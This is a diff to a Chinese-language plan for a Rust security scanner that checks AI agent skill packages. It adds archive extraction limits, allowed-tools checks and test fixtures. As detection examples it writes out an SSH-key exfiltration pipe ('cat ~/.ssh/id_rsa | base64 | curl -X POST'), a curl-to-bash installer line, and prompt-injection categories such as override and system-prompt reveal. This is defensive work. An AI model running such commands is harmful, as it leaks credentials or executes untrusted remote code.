@@ -86,6 +86,7 @@ src-tauri/
     analyzers/
       static_analyzer.rs    # manifest/scripts/references/assets
       structure.rs          # strict structure 子集
+      archive_extractor.rs  # ZIP/TAR/Office 包安全提取与扫描扩展
       pipeline.rs           # pipeline/compound 分析
       analyzability.rs      # 扫描覆盖率与 fail-closed finding
       yara.rs               # 后续可选
@@ -99,6 +100,7 @@ src-tauri/
 - 内部改为多 analyzer 产出统一 `Finding`，最后由 adapter 映射到现有 UI 模型。
 - 所有规则和策略默认本地内置，不调用远程服务。
 - 优先移植确定性检测，不移植依赖 LLM 判断的行为。
+- `scan_file` 与 `scan_directory_with_options` 能力分层：单文件扫描只运行内容级规则；目录扫描才运行结构、引用、压缩包、pipeline、analyzability 等需要完整上下文的 analyzer。
 
 ---
 
@@ -120,6 +122,10 @@ src-tauri/
 - `pipeline.known_installer_domains`
 - `credentials.known_test_values`
 - `finding_output.dedupe`
+- `archive.max_depth`
+- `archive.max_total_size_bytes`
+- `archive.max_file_count`
+- `archive.max_compression_ratio`
 
 规则 YAML 支持：
 
@@ -178,6 +184,7 @@ src-tauri/
 - symlink、隐藏文件、隐藏可执行脚本、非规范扩展名。
 - `SKILL.md` 中引用路径是否路径穿越、是否过深、是否不存在。
 - 目录中存在未引用脚本时给出低/中风险 finding。
+- `allowed-tools` 检查只做确定性分项：Read、Write、Bash、Grep、Glob、Network。不要把“存在 Python helper 脚本”直接判为违规；只有代码实际读写文件、执行 shell、搜索/遍历文件或发起网络请求时才告警。
 
 ### 4.4 Prompt Injection 与 Agent 威胁规则
 
@@ -199,7 +206,39 @@ src-tauri/
 - 对明确“覆盖系统/隐藏行为/绕过策略”的 `SKILL.md` 指令，默认 `High` 或 `Critical`，并进入 `blocked`。
 - 对 references/examples/docs 中的同类文本按 policy 降级，避免教育性文档误报。
 
-### 4.5 Pipeline 与 Compound 分析
+阶段边界：
+
+- P1 只追求 regex/signature 级 Prompt Injection 覆盖，重点是 `SKILL.md`、Markdown、assets/references 中的显式覆盖、绕过、隐藏、泄露 system prompt 指令。
+- `indirect prompt injection`、`unicode steganography`、更复杂的同形字/隐写规则依赖 YARA 或专门静态检查，放到 P4，不作为 P1 验收条件。
+
+### 4.5 Archive 与复合文档提取
+
+Cisco 在主扫描编排前会先执行 archive extraction，将压缩包和 Office Open XML 这类复合文档安全展开后再交给 analyzer。Rust 侧需要把这个能力作为独立模块，而不是只在 pipeline 中识别“解压后执行”的命令文本。
+
+支持范围：
+
+- ZIP 系列：`.zip`、`.jar`、`.war`、`.apk`。
+- TAR 系列：`.tar`、`.tar.gz`、`.tgz`、`.tar.bz2`、`.tar.xz`。
+- Office/OpenDocument：`.docx`、`.xlsx`、`.pptx`、`.odt`、`.ods`、`.odp`。
+
+安全限制：
+
+- 最大嵌套深度。
+- 最大解压总大小。
+- 最大解压文件数。
+- 最大压缩比，超过阈值产生 `ARCHIVE_ZIP_BOMB`。
+- 禁止解压路径穿越，产生 `ARCHIVE_PATH_TRAVERSAL`。
+- 禁止 archive entry symlink，产生高风险 finding。
+- 解压目录使用临时目录，扫描结束必须清理。
+
+输出行为：
+
+- 解压出的文本/脚本文件加入 `SkillContext.files`，参与后续规则、结构、pipeline、analyzability 扫描。
+- 解压失败产生 `ARCHIVE_EXTRACTION_FAILED`，不静默跳过。
+- 嵌套过深产生 `ARCHIVE_NESTED_TOO_DEEP`。
+- Office/PDF 深度结构风险仍放在 P4，但 archive extraction 要先为后续能力预留文件来源和 metadata。
+
+### 4.6 Pipeline 与 Compound 分析
 
 实现独立 `pipeline.rs`，不依赖 LLM。
 
@@ -220,7 +259,7 @@ src-tauri/
 - API 文档型 `curl | jq` 不作为执行链。
 - 同一 pipeline 多入口命中时去重。
 
-### 4.6 Analyzability
+### 4.7 Analyzability
 
 新增可分析性评分，不替代现有安全分，而是作为补充维度：
 
@@ -237,7 +276,18 @@ src-tauri/
 - `skipped_files` 继续记录。
 - 新增 finding 解释为什么 partial，避免 UI 只显示一个布尔值。
 
-### 4.7 Secret 脱敏
+### 4.8 现有流程融合
+
+必须明确兼容当前安装和扫描流程：
+
+- `download_and_analyze` 当前只下载并扫描远端 `SKILL.md`。增强后仍应允许单文件扫描运行，不应因为缺少目录上下文而报 `MISSING_SKILL_MD`、引用缺失或 orphan scripts。
+- `prepare_skill_installation` 会在仓库缓存定位到完整技能目录后调用 `scan_directory_with_options`，这是运行 SkillContext、结构扫描、archive extraction、pipeline、analyzability 的主入口。
+- `rescan_skill_directory_for_confirmation` 使用 `ScanOptions { skip_readme: true }`，增强后仍要遵守 `skip_readme`，避免 README/README.zh.md 重复触发文档类告警。
+- `enforce_installable_report` 依赖 `blocked`、`hard_trigger_issues`、`partial_scan`、`skipped_files`。adapter 必须继续填充这些字段，不能只输出内部 `Finding`。
+- `count_scan_files` 和进度回调 `on_file_scanned` 需要继续可用。若 archive extraction 会增加扫描文件，进度估算可以先保持基于原始目录文件，报告中通过 metadata 标明 extracted files。
+- 数据库和前端目前保存 `security_score`、`security_level`、`security_issues`、`security_report`。新增字段应优先放在 `SecurityIssue` 可选字段或 report metadata 中，旧 UI 不识别也不能破坏反序列化。
+
+### 4.9 Secret 脱敏
 
 所有 secret 类 finding 的 `code_snippet` 必须脱敏：
 
@@ -246,7 +296,7 @@ src-tauri/
 - 通用 token 保留前 4 位或固定前缀。
 - 原始完整 secret 不进入日志、数据库和 UI。
 
-### 4.8 Finding 归一化与报告
+### 4.10 Finding 归一化与报告
 
 内部新增 `Finding`，字段建议：
 
@@ -307,19 +357,27 @@ src-tauri/
 - allowed-tools 基础一致性检查
 - hidden files / orphan scripts finding
 - Secret 脱敏
+- 单文件扫描与目录扫描能力分层
 
 验收：
 
 - 恶意 `SKILL.md` 中的 override/bypass/conceal 指令可阻断。
 - references/docs 中的教育性文本按 policy 降级。
 - 报告不泄露完整 secret。
+- `scan_file(SKILL.md)` 不因缺少完整目录上下文产生结构类误报。
+- Read/Write/Bash/Grep/Glob/Network allowed-tools 分项能按实际行为告警，Python helper 脚本存在本身不告警。
 
-### P2：Pipeline 与组合攻击分析
+### P2：Archive 提取、Pipeline 与组合攻击分析
 
 目标：发现单条正则难覆盖的链路风险。
 
 交付：
 
+- `archive_extractor.rs`
+- `ARCHIVE_ZIP_BOMB`
+- `ARCHIVE_PATH_TRAVERSAL`
+- `ARCHIVE_NESTED_TOO_DEEP`
+- `ARCHIVE_EXTRACTION_FAILED`
 - `pipeline.rs`
 - source/sink/transform 识别
 - fetch-execute、archive-execute、sensitive-exfiltration、find-exec 检测
@@ -331,6 +389,9 @@ src-tauri/
 - `cat ~/.ssh/id_rsa | base64 | curl -X POST ...` 触发高风险。
 - `curl https://bun.sh/install | bash` 在文档/已知安装器策略下可降级。
 - 实际执行语境仍可 hard block。
+- 压缩包内脚本会被加入后续扫描。
+- zip bomb/path traversal archive entry 会产生明确 finding。
+- archive 临时解压目录扫描后清理。
 
 ### P3：Analyzability 与报告归一化
 
@@ -361,6 +422,7 @@ src-tauri/
 - Office 风险：VBA macro、OLE embedded。
 - `.pyc` 与 `.py` 一致性检查。
 - Homoglyph/unicode 隐写增强。
+- indirect prompt injection / unicode steganography parity。
 
 验收：
 
@@ -400,8 +462,10 @@ src-tauri/
 - 兼容回归测试：现有 `scanner.rs` 测试全部保留。
 - Prompt Injection fixture：override、bypass、conceal、system prompt reveal。
 - Structure fixture：frontmatter 缺失、隐藏脚本、路径穿越引用、未引用脚本。
+- Archive fixture：zip bomb、嵌套过深、路径穿越、压缩包内恶意脚本。
 - Pipeline fixture：fetch-execute、archive-execute、secret exfil、known installer 降级。
 - Analyzability fixture：UTF-16、二进制、静态图片、超大文件、不可读文件。
+- Flow fixture：`scan_file(SKILL.md)`、`prepare_skill_installation` 目录扫描、`skip_readme`、进度回调、partial scan 阻断。
 - 性能测试：接近 2000 文件上限的目录扫描耗时。
 
 建议增加一组跨引擎对齐 fixture：
@@ -418,6 +482,7 @@ src-tauri/
 |------|------|
 | 规则外置后启动编译 Regex 成本增加 | lazy cache，按扩展名构建 `RegexSet`，预编译失败在启动时报错 |
 | Prompt Injection 误报 | `exclude_patterns`、文档目录降级、示例文本降级 |
+| Archive extraction 引入资源消耗 | 深度、总大小、文件数、压缩比限制，解压目录扫描后清理 |
 | Pipeline 分析复杂 | 先覆盖高价值链路，不追求完整 shell parser |
 | YARA Rust 依赖不稳定 | P4 可选，不作为 P0-P3 阻塞项 |
 | 报告字段扩展影响前端 | adapter 保持旧字段，新增 metadata 渐进展示 |
@@ -440,8 +505,8 @@ src-tauri/
 ## 10. 建议执行顺序
 
 1. P0：规则外置化、policy、兼容现有 84 条规则。
-2. P1：SkillContext、结构扫描、Prompt Injection、Secret 脱敏。
-3. P2：Pipeline/Compound 分析。
+2. P1：SkillContext、结构扫描、Prompt Injection、Secret 脱敏、现有流程兼容。
+3. P2：Archive extraction、Pipeline/Compound 分析。
 4. P3：Analyzability、Finding 归一化、报告 metadata。
 5. P4：YARA/PDF/Office/bytecode 等深度静态能力。
 
@@ -457,4 +522,3 @@ src-tauri/
 | 计划版本 | v2，按方案一整合 |
 | 参考来源 | 当前项目 `src-tauri/src/security`、`reference/skill_scanner` 本地快照 |
 | 更新时机 | 扫描架构变更、规则包迁移完成、Cisco 参考快照更新 |
-
